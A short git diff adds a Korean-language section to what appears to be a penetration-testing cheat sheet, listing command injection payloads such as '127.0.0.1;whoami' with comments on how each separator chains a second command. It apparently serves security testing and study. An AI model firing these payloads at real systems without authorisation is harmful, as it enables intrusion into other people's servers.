@@ -16,6 +16,27 @@ echo 'hi!' | md5sum
 </details>
 
 ---
+<details>
+    <summary><strong>INPUT</strong></summary>
+
+- `INPUT`란에 아래 페이로드를 테스트 해본 뒤 SQLI/LFI/RFI/SSTI/XSS 테스트.
+```bash
+# 세미콜론 - 이전 명령과 관계없이 다음 명령 실행
+127.0.0.1;whoami
+
+# AND 연산자 - 이전 명령이 성공하면 다음 명령 실행
+127.0.0.1&&whoami
+
+# OR 연산자 - 이전 명령이 실패하면 다음 명령 실행
+127.0.0.1||whoami
+
+# 개행 문자 - 새 줄에서 명령 실행
+127.0.0.1%0awhoami
+```
+    
+</details>
+
+---
 
 <details>
 <summary><strong>XSS (Cross-Site Scripting)</strong></summary>
